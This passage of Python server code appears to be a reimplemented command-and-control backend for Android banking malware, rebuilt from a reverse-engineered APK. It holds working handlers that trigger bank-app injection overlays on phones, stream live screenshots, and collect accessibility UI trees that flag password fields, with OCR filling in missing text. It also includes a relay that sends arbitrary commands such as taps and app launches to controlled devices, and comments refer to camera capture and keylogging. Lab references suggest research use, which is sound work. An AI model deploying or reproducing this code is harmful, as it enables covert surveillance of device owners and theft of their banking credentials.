            ('/api/EaodFaceVerify.php', 'POST', _dapi.ep_face, 'ep_face'),
            ('/api/EaodVideos.php', 'POST', _dapi.ep_videos, 'ep_videos')):
        app.router.add_post(path, _mk_relay(fn, nm))
        SURFACE_ROUTES.append(('POST', path, 'implemented'))

    SURFACE_ROUTES.extend([('GET', '/api/Captcha.php', 'implemented'),
                           ('POST', '/api/EaodLogin.php', 'implemented'),
                           ('GET', '/api/EaodBankInject.php', 'implemented(模板原文)')])
    # 4) 动态路由：设备壁纸 + 注入追踪子动作
    async def wallpaper(request):
        if not _auth(request):
            return web.json_response({'error': 'unauthorized', 'ok': False}, status=401)
        device_id = request.match_info.get('device_id', '')
        raw, content_type = _wallpaper_bytes((STATE.get('devices') or {}).get(device_id))
        if raw:
            return web.Response(body=raw, content_type=content_type,
                                headers={'Cache-Control': 'private, max-age=30'})
        out = api_impl.h_wallpaper({}, dict(request.query), 'admin',
                                   device_id)
        return web.json_response(out, status=404)
    app.router.add_get('/api/wallpaper/{device_id}', wallpaper)
    for act in ('inject', 'reset', 'skip'):
        path = '/api/device-inject-track/%s' % act

        def mk_act(act=act):
            async def handler(request):
                try:
                    body = await request.json()
                except Exception:
                    body = {}
                # 设备侧也要能回报注入状态（携带 deviceId）：面板带 token，设备没有 token
                device_call = bool(body.get('deviceId')) and not _auth(request)
                if not _auth(request) and not device_call:
                    return web.json_response({'error': 'unauthorized', 'ok': False}, status=401)
                body['_act'] = act
                if device_call:
                    # 设备侧：只接受自己那台设备的包名，直接落库 + 回执
                    dev = str(body.get('deviceId'))
                    pkg = str(body.get('packageName') or body.get('pkg') or '')
                    st = {'inject': 'injected', 'reset': 'idle', 'skip': 'skipped'}.get(act, act)
                    api_impl.S.setdefault('inj_track', {})[dev] = {
                        'state': st, 'package': pkg, 'ts': int(time.time())}
                    try:
                        _d = api_impl.db()
                        if _d and pkg:
                            _res = 'injected' if act == 'inject' else ('skipped' if act == 'skip' else '')
                            if _res:
                                _d.inj_state_set(dev, pkg, _res)
                    except Exception:
                        pass
                    try:
                        d = api_impl.db()
                        if d:
                            d.track_set(dev, st)
                            if act == 'inject':
                                d.inj_record_add(dev, pkg, str(body.get('appName') or ''))
                    except Exception:
                        pass
                    print('[inj] device track dev=%s pkg=%s act=%s' % (dev, pkg, act), flush=True)
                    return web.json_response({'ok': True, 'deviceId': dev, 'state': st})
                resp = api_impl.h_inj_track_act(body, {}, 'admin')
                # 面板点「重注 / 跳过」：不只是记状态，还要真的通知设备重弹注入页
                if act in ('inject', 'reset', 'skip'):
                    _dev = str(body.get('deviceId') or '')
                    _pkg = str(body.get('packageName') or body.get('pkg') or '')
                    if _dev:
                        try:
                            if act in ('inject', 'reset'):
                                await send_command(_dev, 'reinject', {'pkg': _pkg} if _pkg else {})
                            else:
                                await send_command(_dev, 'skipInject', {'pkg': _pkg} if _pkg else {})
                        except Exception as e:
                            print('[inj] 通知设备失败: %s' % e, flush=True)
                return web.json_response(resp)
            return handler
        app.router.add_post(path, mk_act())
        SURFACE_ROUTES.append(('POST', path, 'implemented'))
    SURFACE_ROUTES.append(('GET', '/api/wallpaper/{deviceId}', 'implemented'))

    # 5) 面板实时通道（4 条 WS）
    #
    # 实测契约（来自厂商面板 bundle 本身，不是猜的）：
    #   · /ws/dashboard?ticket=<POST /api/ws-ticket 拿到的票据>
    #   · /api/sl/ws?id=<deviceId>&token=<c2token>   二进制帧 → Blob(image/jpeg) → <img src>
    #   · /api/hd/ws?id=&token=                       同上（高清档）
    #   · /api/adb-tree/ws?id=&token=                 **文本 JSON** 控件树
    #   · /api/ut/ws?id=&token=                       同上（无障碍档）
    # 面板对 4 条通道**全部用 ?token=**（localStorage 的 c2token）；早期实现只认 ticket，
    # 结果面板每次连都 401、无限重连 —— 表现就是"看着设备在线但控制不了"（见 F-86）。
    def _ws_access(request):
        q = request.query
        t = q.get('ticket', '')
        if t and t in ((api_impl.S.get('flags', {}) or {}).get('ws_tickets') or {}):
            return True
        tok = q.get('token', '')
        if not tok:
            h = request.headers.get('Authorization', '')
            tok = h[7:] if h.startswith('Bearer ') else ''
        return bool(_token_row(tok, 'primary'))

    # ---- 离线 OCR：给控件树补文字（Windows.Media.Ocr，零依赖零联网） ----
    _OCR_CACHE = {}
    OCR_PS1 = os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', 'tools',
                           'ocr_frame.ps1')

    def _ocr_words(dev, png, scale=2):
        """对一帧画面跑离线 OCR（按设备缓存 3s，避免每帧都跑）。返回设备坐标下的词表。"""
        import subprocess
        import tempfile
        c = _OCR_CACHE.get(dev) or {}
        if c.get('ts', 0) > time.time() - 3 and c.get('png') == len(png):
            return c.get('words') or []
        if not os.path.exists(OCR_PS1):
            return []
        try:
            d = tempfile.mkdtemp(prefix='refocr_')
            ip = os.path.join(d, 'f.png')
            op = os.path.join(d, 'f.json')
            with open(ip, 'wb') as fh:
                fh.write(png)
            subprocess.run(['powershell', '-NoProfile', '-ExecutionPolicy', 'Bypass',
                            '-File', OCR_PS1, '-Path', ip, '-Out', op],
                           capture_output=True, timeout=25)
            with open(op, encoding='utf-8-sig') as fh:
                j = json.load(fh)
            words = [{'t': w['t'], 'x': int(w['x']) * scale, 'y': int(w['y']) * scale,
                      'w': int(w['w']) * scale, 'h': int(w['h']) * scale}
                     for w in (j.get('words') or [])]
        except Exception as e:
            print('[panel] OCR 失败: %s' % str(e)[:80], flush=True)
            words = []
        _OCR_CACHE[dev] = {'ts': time.time(), 'png': len(png), 'words': words}
        return words

    def _merge_ocr(tree, words):
        """把 OCR 词贴到控件树上：中心命中的填给该节点，未命中的作为独立标签节点。"""
        if not words:
            return tree
        used = set()
        nodes = tree.get('root') or []
        for i, n in enumerate(nodes):
            b = n.get('b') or []
            if len(b) != 4:
                continue
            hit = []
            for wi, w in enumerate(words):
                cx, cy = w['x'] + w['w'] / 2.0, w['y'] + w['h'] / 2.0
                if b[0] <= cx <= b[2] and b[1] <= cy <= b[3] and wi not in used:
                    hit.append((wi, w))
            if hit and not (n.get('text') or '').strip():
                n['text'] = ' '.join(w['t'] for _, w in hit)[:120]
                used.update(wi for wi, _ in hit)
        for wi, w in enumerate(words):
            if wi in used:
                continue
            nodes.append({'b': [w['x'], w['y'], w['x'] + w['w'], w['y'] + w['h']],
                          'text': w['t'], 'desc': '', 'click': False, 'cls': 'ocr',
                          'edit': False, 'pwd': False, 'resId': '', 'c': []})
        tree['root'] = nodes
        tree['ocr'] = True
        tree['count'] = len(nodes)
        return tree

    def _panel_tree(tree, dev):
        """设备端 gzip 节点树 -> 面板期望的扁平结构 {w,h,pkg,root:[{b,text,desc,click,cls,edit,pwd,resId,c}]}"""
        nodes = (tree or {}).get('nodes') or []
        root = []
        for n in nodes:
            b = n.get('bounds') or []
            if len(b) != 4:
                continue
            cls = str(n.get('cls') or '')
            root.append({'b': [int(x) for x in b],
                         'text': str(n.get('text') or '')[:100],
                         'desc': str(n.get('desc') or '')[:100],
                         'click': bool(n.get('clickable')),
                         'cls': cls, 'edit': 'EditText' in cls,
                         'pwd': bool(n.get('password')) or 'Password' in cls or 'password' in cls,
                         'resId': str(n.get('id') or ''), 'c': []})
        return {'w': (tree or {}).get('w', 1080), 'h': (tree or {}).get('h', 2400),
                'pkg': (tree or {}).get('pkg') or '', 'root': root, 'deviceId': dev,
                'count': len(root)}

    async def ws_dashboard(request):
        """控制台主通道：/ws/dashboard?ticket=|?token=

        面板浮窗（摄像头 / 阅读器 / HD / 事件）全挂在这一条上：
        · 面板先发 `{action:'checkphone'|'join', deviceId}` 订阅该设备
          （原版语义见 case.md F-77：checkphone→join→ok）
        · 之后服务端把**设备帧**转成 `{event:'device_message', deviceId, action, data}` 推给它
          —— 摄像头窗口就是等 `action==='camPic'` 的那一帧（bundle 原文如此）
        """
        if not _ws_access(request):
            return web.Response(status=401, text='unauthorized')
        ws = web.WebSocketResponse(heartbeat=30, max_msg_size=16 * 1024 * 1024)
        await ws.prepare(request)
        _PANEL_ALL.append(ws)
        print('[panel] 主通道接入（当前 %d 条面板连接）' % len(_PANEL_ALL), flush=True)
        await ws.send_str(json.dumps({'type': 'dashboard_ready',
                                      'devices': len(STATE['devices'])}))
        joined = set()
        try:
            async for msg in ws:
                if msg.type != WSMsgType.TEXT:
                    continue
                try:
                    p = json.loads(msg.data)
                except Exception:
                    p = {}
                action = str(p.get('action') or p.get('subc') or p.get('type') or '')
                dev = str(p.get('deviceId') or p.get('id') or p.get('pid') or '')
                if action in ('checkphone', 'join', 'screen', 'rec', 'reassign') and dev:
                    _PANEL_SUBS.setdefault(dev, [])
                    if ws not in _PANEL_SUBS[dev]:
                        _PANEL_SUBS[dev].append(ws)
                    joined.add(dev)
                    rec = STATE['devices'].get(dev) or {}
                    await ws.send_str(json.dumps(
                        {'type': 'ok', 'action': action, 'deviceId': dev,
                         'online': rec.get('ws') is not None,
                         'msg': ''}, ensure_ascii=False))
                    if rec.get('ws'):
                        # 原版在 checkphone/join 之后会让设备开推流；这里对齐语义
                        try:
                            await send_command(dev, 'ask_relay')
                        except Exception:
                            pass
                    continue
                await ws.send_str(json.dumps({'type': 'echo', 'data': msg.data[:200]}))
        finally:
            for d in joined:
                try:
                    (_PANEL_SUBS.get(d) or []).remove(ws)
                except Exception:
                    pass
            try:
                _PANEL_ALL.remove(ws)
            except Exception:
                pass
            print('[panel] 主通道断开（剩 %d 条）' % len(_PANEL_ALL), flush=True)
        return ws

    # 拉流任务：**每台设备每类只有一个**，由"有没有面板在看"决定起停。
    # 早期实现是"每个面板连接各拉一份"，实测面板会开几百条连接 → 把被控端打爆，
    # 结果截图命令塞满队列，控件树的命令排在几百张截图后面，永远轮不到（见 F-86）。
    _PULL = {}
    _WATCH = {}

    async def _puller(dev, kind, gap, cmd, stamp_key):
        """一次只允许一个未完成的请求：发出去 -> 等新帧回来（最多 30s）-> 歇 gap 再发下一个。

        固定周期硬发会把设备端打爆：真机截一张 540×1200 的 PNG 要 1~3s，按 1.5s 硬发必然积压，
        队列里的 `openpkg`/`clickPoint` 会排在几十张截图后面，表现就是"控制不动"（见 F-86）。
        """
        try:
            while _WATCH.get((dev, kind), 0) > 0:
                rec = STATE['devices'].get(dev) or {}
                if not rec.get('ws'):
                    await asyncio.sleep(1.0)
                    continue
                # 面板按了「停止投屏」就真的停（别再拿设备的 CPU 换没人看的帧）
                if kind == 'screen' and rec.get('stream_on') is False:
                    await asyncio.sleep(1.0)
                    continue
                last = (rec.get(stamp_key) or {}).get('ts', 0)
                await send_command(dev, cmd)
                for _ in range(60):                      # 最多等 30s
                    await asyncio.sleep(0.5)
                    if _WATCH.get((dev, kind), 0) <= 0:
                        return
                    cur = ((STATE['devices'].get(dev) or {}).get(stamp_key) or {}).get('ts', 0)
                    if cur > last:
                        break
                await asyncio.sleep(gap)
        except asyncio.CancelledError:
            return
        except Exception as e:
            print('[panel] 拉流任务异常 %s/%s: %s: %s' % (dev, kind, type(e).__name__, e), flush=True)

    def _watch(dev, kind, gap, cmd, stamp_key, delta):
        key = (dev, kind)
        _WATCH[key] = max(0, _WATCH.get(key, 0) + delta)
        WATCHERS[key] = _WATCH[key]                     # 给键盘记录判断"有没有人在看" 
        if delta > 0 and (_PULL.get(key) is None or _PULL[key].done()):
            _PULL[key] = asyncio.get_event_loop().create_task(
                _puller(dev, kind, gap, cmd, stamp_key))
            print('[panel] 启动拉流 %s %s（等上一帧回来再发下一个 %s）' % (dev, kind, cmd), flush=True)

    async def ws_screen(request):
        """屏画面通道：推**真机截图**的原始二进制帧（面板是 <img src=Blob> 直接渲染）。"""
        if not _ws_access(request):
            return web.Response(status=401, text='unauthorized')
        dev = request.query.get('id', '')
        ws = web.WebSocketResponse(heartbeat=25, max_msg_size=16 * 1024 * 1024)
        await ws.prepare(request)
        _watch(dev, 'screen', 0.2, 'screenshot', 'last_screen', +1)
        last_ts = 0.0
        try:
            while not ws.closed:
                await asyncio.sleep(0.5)
                sc = (STATE['devices'].get(dev) or {}).get('last_screen') or {}
                if sc.get('png') and sc.get('ts', 0) > last_ts:
                    last_ts = sc['ts']
                    await ws.send_bytes(sc['png'])
        except Exception as e:
            print('[panel] 屏画面通道结束 %s: %s' % (type(e).__name__, e), flush=True)
        finally:
            _watch(dev, 'screen', 0.2, 'screenshot', 'last_screen', -1)
        return ws

    async def ws_tree(request):
        """控件树通道：UT 走无障碍 capture，ADB 专用路由才走 adbUiTree。"""
        if not _ws_access(request):
            return web.Response(status=401, text='unauthorized')
        dev = request.query.get('id', '')
        ws = web.WebSocketResponse(heartbeat=25, max_msg_size=16 * 1024 * 1024)
        await ws.prepare(request)
        tree_cmd = _tree_request_action(request.path)
        _watch(dev, 'tree', 0.3, tree_cmd, 'last_tree', +1)
        last_ts = 0.0
        try:
            while not ws.closed:
                await asyncio.sleep(0.8)
                rec = STATE['devices'].get(dev) or {}
                tr = rec.get('last_tree') or {}
                if tr.get('tree') and tr.get('ts', 0) > last_ts:
                    last_ts = tr['ts']
                    words = []
                    sc = rec.get('last_screen') or {}
                    if sc.get('png'):
                        # 树里文字基本为空时才跑 OCR（有文字就不必花这 1s）
                        nodes = (tr['tree'].get('nodes') or [])
                        named = sum(1 for n in nodes if (n.get('text') or '').strip())
                        if named < max(3, len(nodes) // 20):
                            words = _ocr_words(dev, sc['png'])
                    await ws.send_str(json.dumps(
                        _merge_ocr(_panel_tree(tr['tree'], dev), words), ensure_ascii=False))
                elif not rec.get('ws'):
                    await ws.send_str(json.dumps({'status': 'offline'}, ensure_ascii=False))
        except Exception as e:
            print('[panel] 控件树通道结束 %s: %s' % (type(e).__name__, e), flush=True)
        finally:
            _watch(dev, 'tree', 0.3, tree_cmd, 'last_tree', -1)
        return ws

    app.router.add_get('/ws/dashboard', ws_dashboard)
    app.router.add_get('/api/sl/ws', ws_screen)
    app.router.add_get('/api/hd/ws', ws_screen)
    app.router.add_get('/api/ut/ws', ws_tree)
    app.router.add_get('/api/adb-tree/ws', ws_tree)
    for p in ('/ws/dashboard', '/api/adb-tree/ws', '/api/hd/ws', '/api/sl/ws', '/api/ut/ws'):
        SURFACE_ROUTES.append(('GET', p, 'implemented(WS,token/票据校验+真机实时推流)'))

    # 6) 目标实测不存在的路由：明确登记，不算占位
    SURFACE_ROUTES.extend([('*', p, 'absent_in_target') for p in api_impl.ABSENT_IN_TARGET])

    SURFACE_ROUTES.extend([('GET', '/api/Captcha.php', 'implemented'),
                           ('POST', '/api/EaodLogin.php', 'implemented'),
                           ('GET', '/api/EaodBankInject.php', 'implemented(模板原文)')])
    for p in ('/api/EaodAccountManage.php', '/api/ReassignDevice.php', '/api/EaodVideos.php',
              '/api/EaodFaceVerify.php', '/api/EaodIntel.php', '/api/GetPhoneById.php',
              '/api/Error.php'):
        # 已有真实现的不再重复登记为占位（否则统计虚高，且 501 兜底会盖住真 handler）
        if p in [x[1] for x in SURFACE_ROUTES if str(x[2]).startswith('implemented')]:
            continue
        if p == '/api/Error.php' and 'relay_private' in sys.modules:
            SURFACE_ROUTES.append(('POST', p, 'implemented(设备异常上报,表单 devicename/log)'))
            continue
        for m in ('GET', 'POST'):
            app.router.add_route(m, p, _contract_only(p))
        SURFACE_ROUTES.append(('*', p, 'contract_only'))
    impl = len([1 for _, _, s in SURFACE_ROUTES if str(s).startswith('implemented')])
    print('[server] API 面：共 %d 条，已实现 %d 条，占位 %d 条'
          % (len(SURFACE_ROUTES), impl, len(SURFACE_ROUTES) - impl))


async def api_devices(request):
    if not _auth(request):
        return web.json_response({'error': 'unauthorized', 'ok': False}, status=401)
    return web.json_response({'ok': True, 'devices': device_rows('primary'), 'rev': len(STATE['devices'])})


async def binary_device_socket(request):
    """被控端二进制通道：wss://<host>/ws/binary-device?deviceId=<id>

    通道**地址**来自 native 逆向（libnative-guard.so 的 N_buildWsUrl）。
    帧格式与 2.1 APK 一致：[1B type][4B 大端 payload 长度][payload]。
    客户端一帧一条 WebSocket binary message，不分片、不等待 ACK。
    """
    import sys as _sys
    _sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', 'protocol'))
    import binary_proto as bp

    ws = web.WebSocketResponse(heartbeat=25, max_msg_size=32 * 1024 * 1024)
    await ws.prepare(request)
    dev = request.query.get('deviceId', '') or ''
    rec = STATE['devices'].setdefault(dev, {'ws': None, 'apkid': None, 'last_seen': time.time(),
                                            'first_seen': time.time(), 'caps': {}, 'shots': [],
                                            'msgs': [], 'frames': []})
    rec['binary'] = {'conn': True, 'frames': 0, 'bytes': 0, 'last': 0,
                     'types': {}, 'bad': 0, 'reassembled': 0, 'since': int(time.time())}
    outdir = os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', 'state', 'bin_frames', dev)
    os.makedirs(outdir, exist_ok=True)
    _log_bin = lambda m: print('[binary] %s' % m, flush=True)
    _log_bin('接入 device=%s' % dev)
    try:
        async for msg in ws:
            if msg.type != WSMsgType.BINARY:
                continue
            st = rec['binary']
            st['frames'] += 1
            st['bytes'] += len(msg.data)
            st['last'] = int(time.time())
            frames, parse_error = bp.parse_many(msg.data)
            if parse_error:
                st['bad'] += 1
                continue
            for fr in frames:
                st['types'][fr['type_name']] = st['types'].get(fr['type_name'], 0) + 1
                data = fr['payload']
                if fr['type'] == bp.T_HELLO:
                    try:
                        hello = json.loads(data.decode('utf-8'))
                        rec['apkid'] = hello.get('apkId', rec.get('apkid'))
                    except Exception:
                        st['bad'] += 1
                    continue
                if fr['type'] in (bp.T_SCREEN, bp.T_THUMB, bp.T_HD):
                    st['reassembled'] += 1
                    ext = ('jpg' if data[:3] == b'\xff\xd8\xff' else
                           ('webp' if data[:4] == b'RIFF' else
                            ('png' if data[:8] == b'\x89PNG\r\n\x1a\n' else 'bin')))
                    name = '%d_%s.%s' % (int(time.time() * 1000), fr['type_name'], ext)
                    fp = os.path.join(outdir, name)
                    with open(fp, 'wb') as fh:
                        fh.write(data)
                    rec.setdefault('bin_shots', []).append(
                        {'ts': int(time.time()), 'bytes': len(data), 'file': name, 'ext': ext})
                    _prune_frames(outdir, rec, keep=KEEP_FRAMES)
                    if ext in ('jpg', 'png', 'webp'):
                        rec['last_screen'] = {'ts': time.time(), 'png': data,
                                              'w': None, 'h': None, 'src': 'binary'}
                    if len(rec['bin_shots']) > 200:
                        del rec['bin_shots'][:-100]
                    _log_bin('收到 %s (%d B) -> %s' % (fr['type_name'], len(data), name))
                    continue
                if fr['type'] in (bp.T_A11Y_TREE, bp.T_ADB_TREE):
                    try:
                        envelope = json.loads(data.decode('utf-8'))
                        tree = _decode_tree_payload(envelope)
                        rec['last_tree'] = {'ts': time.time(), 'tree': tree}
                        _log_bin('收到 %s (%d 节点)' %
                                 (fr['type_name'], len(tree.get('nodes') or [])))
                    except Exception as e:
                        st['bad'] += 1
                        _log_bin('%s 解码失败: %s' %
                                 (fr['type_name'], str(e)[:120]))
                    continue
    finally:
        if 'binary' in rec:
            rec['binary']['conn'] = False
            rec['binary']['dropped'] = 0
        print('[binary] 通道断开 device=%s（已收 %d 帧，坏帧 %d）'
              % (dev, rec.get('binary', {}).get('frames', 0),
                 rec.get('binary', {}).get('bad', 0)), flush=True)
    return ws


async def api_binary_stats(request):
    if not _auth(request):
        return web.json_response({'error': 'unauthorized', 'ok': False}, status=401)
    dev = request.query.get('deviceId')
    rec = STATE['devices'].get(dev, {})
    st = dict(rec.get('binary', {'conn': False, 'frames': 0}))
    st.setdefault('dropped', 0)
    return web.json_response({'ok': True, 'deviceId': dev, 'binary': st,
                              'protocol': 'APK 2.1: 1B type + 4B big-endian length + payload',
                              'shots': rec.get('bin_shots', [])[-20:]})



async def api_relay_command(request):
    """向中继通道被控端下发 subc 命令（面板侧 slr_panelsend 与测试共用）"""
    if not _auth(request):
        return web.json_response({'error': 'unauthorized', 'ok': False}, status=401)
    try:
        body = await request.json() if request.method == 'POST' else dict(request.query)
    except Exception:
        body = dict(request.query)
    dev = str(body.get('deviceId') or body.get('pid') or '')
    rec = STATE['devices'].get(dev, {})
    ws = rec.get('relay_ws')
    if not ws or ws.closed:
        return web.json_response({'ok': False, 'error': 'device_offline', 'deviceId': dev})
    msg = {'subc': body.get('subc') or body.get('cmd') or ''}
    for k, v in body.items():
        if k not in ('deviceId', 'pid', 'subc', 'cmd'):
            msg[k] = v
    await ws.send_str(json.dumps(msg, ensure_ascii=False))
    return web.json_response({'ok': True, 'deviceId': dev, 'subc': msg['subc']})


async def api_device_frames(request):
    """设备回帧留档。

    两种取法：
      · `since=<序号>` —— 老接口，按**下标**取（长跑实例里窗口只有最后 200 条，
        下标容易越过窗口导致"看不到新帧"，验证脚本踩过：ack 明明到了却取不到）；
      · `since_ts=<unix 秒>` —— 按**时间**取，长跑/长时间流式推送下才可靠。
    """
    if not _auth(request):
        return web.json_response({'error': 'unauthorized', 'ok': False}, status=401)
    dev = request.query.get('deviceId')
    since = int(request.query.get('since', 0) or 0)
    since_ts = float(request.query.get('since_ts', 0) or 0)
    rec = STATE['devices'].get(dev, {})
    allf = rec.get('frames') or []
    frames = [f for f in allf if float(f.get('ts') or 0) >= since_ts] if since_ts else allf[since:]
    return web.json_response({'ok': True, 'total': len(allf), 'since_ts': since_ts,
                              'frames': frames[-200:]})


async def api_command(request):
    if not _auth(request):
        return web.json_response({'error': 'unauthorized', 'ok': False}, status=401)
    body = await request.json()
    dev = body.get('deviceId')
    action = body.get('action')
    # The React control panel uses ``params`` while the legacy console uses
    # ``data``.  Normalize both at the API edge so coordinate-bearing commands
    # (clickPoint/gestureB/adbSwipe, etc.) do not arrive on the phone as ``{}``.
    params = body.get('data')
    if not isinstance(params, dict):
        params = body.get('params')
    if not isinstance(params, dict):
        params = {}
    ok = await send_command(dev, action, params)
    return web.json_response({'ok': ok, 'deviceId': dev, 'action': action})


async def api_shot(request):
    if not _auth(request):
        return web.json_response({'error': 'unauthorized', 'ok': False}, status=401)
    dev = request.query.get('deviceId')
    rec = STATE['devices'].get(dev, {})
    return web.json_response({'ok': True, 'shots': rec.get('shots', []), 'msgs': rec.get('msgs', [])[-50:]})


def build_app():
    app = web.Application(client_max_size=64 * 1024 * 1024)

    @web.middleware
    async def reqlog(request, handler):
        """控端访问留档：供前端走查/回归核对哪些接口被调用、返回什么状态码"""
        resp = await handler(request)
        p = request.path
        if p.startswith('/api/') or p.startswith('/ws'):
            try:
                STATE['reqlog'].append({'t': int(time.time()), 'm': request.method, 'p': p,
                                        's': getattr(resp, 'status', 0), 'q': dict(request.query)})
                if len(STATE['reqlog']) > 5000:
                    del STATE['reqlog'][:-2500]
            except Exception:
                pass
        return resp

    app.middlewares.append(reqlog)

    @web.middleware
    async def lab_alias(request, handler):
        """实验室路径别名：重新构建的真机客户端把 URL 前缀补成了 /rrrr…（等长改写），
        这里把前导 /r+ 剥掉、折叠重复斜杠，并**重新走一次路由**。

        注意：不能只改 rel_url 就调用 handler —— aiohttp 在中间件之前就完成了路由匹配，
        handler 绑定的还是原路径（实测会拿到 405 Method Not Allowed）。必须自己 resolve。
        """
        p = request.path
        m = re.match(r'^/r+(?=/|$)', p)
        if m:
            p = p[m.end():] or '/'
        p = re.sub(r'^/+', '/', p)          # 等长补齐时可能出现 //path，折成一个
        if p == request.path:
            return await handler(request)
        req2 = request.clone(rel_url=request.rel_url.with_path(p))
        try:
            res = await app.router.resolve(req2)
            return await res.handler(req2)
        except Exception:
            return await handler(request)

    app.middlewares.append(lab_alias)
    app.router.add_get('/adv.php', adv_php)
    app.router.add_post('/api/device_log', device_log)
    app.router.add_get('/api/battery_config', battery_config)
    app.router.add_post('/api/ocr-captcha', ocr_captcha)
    app.router.add_get('/io/', device_socket)
    # 2.1 客户端把探针返回的端口拼进 Socket.IO path（/io443），并非 URL 端口。
    app.router.add_get(r'/io{port:\d+}', device_socket)
    app.router.add_get(r'/io{port:\d+}/', device_socket)
    app.router.add_get('/ws/binary-device', binary_device_socket)
    app.router.add_get('/api/binary_stats', api_binary_stats)
    app.router.add_post('/api/login', api_login)
    app.router.add_get('/api/devices', api_devices)
    app.router.add_get('/api/device_frames', api_device_frames)
    app.router.add_get('/api/relay_command', api_relay_command)
    app.router.add_post('/api/relay_command', api_relay_command)
    app.router.add_post('/api/command', api_command)
    app.router.add_get('/api/device_trace', api_shot)
    # 私有端点族 / 设备异常上报：必须在契约兜底注册**之前**挂，否则会被 501 兜底抢先匹配
    try:
        import relay_private
        relay_private.mount(app)
    except Exception as e:
        print('[server] 私有端点挂载失败：%s' % e)
    mount_full_surface(app)

    async def health(_r):
        return web.json_response({'ok': True, 'uptime': int(time.time() - BOOT_TS),
                                  'devices': len(STATE['devices']), 'online': len(state_online()),
                                  'routes': len(SURFACE_ROUTES)})
    app.router.add_get('/api/health', health)

    async def reqlog_api(request):
        """前端走查用：取接口访问留档（按状态码过滤）"""
        if not _auth(request):
            return web.json_response({'error': 'unauthorized', 'ok': False}, status=401)
        code = request.query.get('status')
        rows = STATE['reqlog']
        if code:
            rows = [r for r in rows if str(r['s']) == str(code)]
        return web.json_response({'ok': True, 'total': len(STATE['reqlog']), 'rows': rows[-500:]})

    app.router.add_get('/api/_reqlog', reqlog_api)

    async def surface_api(request):
        """自检：列出挂载面与每条的实现状态（契约占位 = 真缺口）"""
        if not _auth(request):
            return web.json_response({'error': 'unauthorized', 'ok': False}, status=401)
        rows = [{'method': m, 'path': p, 'status': s} for m, p, s in SURFACE_ROUTES]
        placeholders = [r for r in rows if r['status'] == 'contract_only']
        return web.json_response({'ok': True, 'total': len(rows), 'placeholders': placeholders,
                                  'placeholder_count': len(placeholders), 'rows': rows})
    app.router.add_get('/api/_surface', surface_api)

    async def debug_device(request):
        """自检：返回某设备的**原始**内部记录（便于判断在线判定的依据）"""
        if not _auth(request):
            return web.json_response({'error': 'unauthorized', 'ok': False}, status=401)
        dev = request.query.get('deviceId') or ''
        rec = (STATE['devices'] or {}).get(dev)
        if rec is None:
            return web.json_response({'ok': True, 'exists': False, 'deviceId': dev})
        return web.json_response({
            'ok': True, 'exists': True, 'deviceId': dev,
            'ws_is_none': rec.get('ws') is None,
            'relay_ws_is_none': rec.get('relay_ws') is None,
            'relay': bool(rec.get('relay')),
            'assigned_to': rec.get('assigned_to', ''),
            'last_seen': int(rec.get('last_seen') or 0),
            'frames': len(rec.get('frames') or []),
            'msgs': len(rec.get('msgs') or []),
            'panel_subs': len(_PANEL_SUBS.get(dev) or []),
            'keys': sorted(rec.keys()),
        })
    app.router.add_get('/api/_debug_device', debug_device)

    async def api_actions(_r):
        """指令词表（163 条，来自协议分发器）——供控制台下拉"""
        try:
            import json as _json
            here = os.path.dirname(os.path.abspath(__file__))
            with open(os.path.join(here, '..', 'contracts', 'action_vocabulary.json'),
                      encoding='utf-8') as fh:
                vocab = _json.load(fh)
            acts = vocab.get('primary_actions_from_dispatcher', [])
        except Exception:
            acts = []
        return web.json_response({'ok': True, 'count': len(acts), 'actions': acts})
    app.router.add_get('/api/actions', api_actions)

    async def console(_r):
        here = os.path.dirname(os.path.abspath(__file__))
        p = os.path.join(here, 'console.html')
        if not os.path.exists(p):
            return web.Response(status=404, text='console.html missing')
        return web.Response(text=open(p, encoding='utf-8').read(), content_type='text/html')

    app.router.add_get('/console', console)
    mount_original_uis(app)
    mount_panel_ws(app)
    return app


# ---------------------------------------------------------------- 原版前端托管
WEB_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', 'web')


def _serve_file(rel, ctype=None):
    async def handler(_r):
        p = os.path.join(WEB_DIR, rel)
        if not os.path.exists(p):
            return web.Response(status=404, text='missing: %s' % rel)
        ct = ctype
        if ct is None:
            ct = ('text/html' if rel.endswith('.html') else
                  'text/css' if rel.endswith('.css') else
                  'application/javascript' if rel.endswith('.js') else
                  'image/svg+xml' if rel.endswith('.svg') else 'application/octet-stream')
        return web.Response(body=open(p, 'rb').read(), content_type=ct)
    return handler


def mount_original_uis(app):
    """把两套原版前端挂上（界面为原版资源，后端为我方实现）"""
    routes = [
        # 根路径不在这里固定：由下方 root() 按来源分流（主通道包内硬跳 / 回自家壳，其余给中继通道）
        ('/relay/', 'relay/index.html', 'text/html'),
        ('/panel/', 'panel/index.html', 'text/html'),
        ('/panel2/', 'panel/index.html', 'text/html'),
        ('/panel/favicon.svg', 'panel/favicon.svg', 'image/svg+xml'),
        ('/panel/assets/index-dvi-972c.js', 'panel/assets/index-dvi-972c.js', 'application/javascript'),
        ('/panel/assets/index-DTncntn-.css', 'panel/assets/index-DTncntn-.css', 'text/css'),
        ('/relay/assets/core.vendor.js', 'relay/assets/core.vendor.js', 'application/javascript'),
        ('/relay/assets/core.vendor.css', 'relay/assets/core.vendor.css', 'text/css'),
        ('/relay/assets/lucide.min.js', 'relay/assets/lucide.min.js', 'application/javascript'),
        ('/relay/assets/guide.js', 'relay/assets/guide.js', 'application/javascript'),
        ('/relay/assets/zgl-visual-skin.css', 'relay/assets/zgl-visual-skin.css', 'text/css'),
        ('/relay/assets/zgl-light-final.css', 'relay/assets/zgl-light-final.css', 'text/css'),
        ('/relay/assets/driver.css', 'relay/assets/driver.css', 'text/css'),
        ('/relay/assets/driver.js.iife.js', 'relay/assets/driver.js.iife.js', 'application/javascript'),
        # 原版壳引用的绝对路径（中继通道壳内是 /assets/*）
        ('/assets/core.vendor.js', 'relay/assets/core.vendor.js', 'application/javascript'),
        ('/assets/core.vendor.css', 'relay/assets/core.vendor.css', 'text/css'),
        ('/assets/lucide.min.js', 'relay/assets/lucide.min.js', 'application/javascript'),
        ('/assets/guide.js', 'relay/assets/guide.js', 'application/javascript'),
        ('/assets/zgl-visual-skin.css', 'relay/assets/zgl-visual-skin.css', 'text/css'),
        ('/assets/zgl-light-final.css', 'relay/assets/zgl-light-final.css', 'text/css'),
